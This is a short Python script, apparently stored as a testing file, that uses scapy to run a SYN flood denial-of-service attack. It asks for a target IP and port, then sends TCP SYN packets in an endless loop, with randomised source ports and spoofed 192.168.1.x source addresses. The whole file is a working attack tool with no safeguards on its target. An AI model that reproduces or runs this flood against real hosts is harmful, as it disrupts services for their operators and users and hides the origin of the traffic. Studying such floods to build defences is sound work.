# testing/dos.py
from scapy.all import *
import random

target_ip = input("enter the target ip:")  # Change this to the target IP
target_port = int(input("enter the port no :"))  # Change to the target port

def syn_flood(target_ip, target_port):
    print(f"Starting SYN Flood Attack on {target_ip}:{target_port}")
    while True:
        ip_layer = IP(src=f"192.168.1.{random.randint(2, 254)}", dst=target_ip)
        tcp_layer = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)

syn_flood(target_ip, target_port)
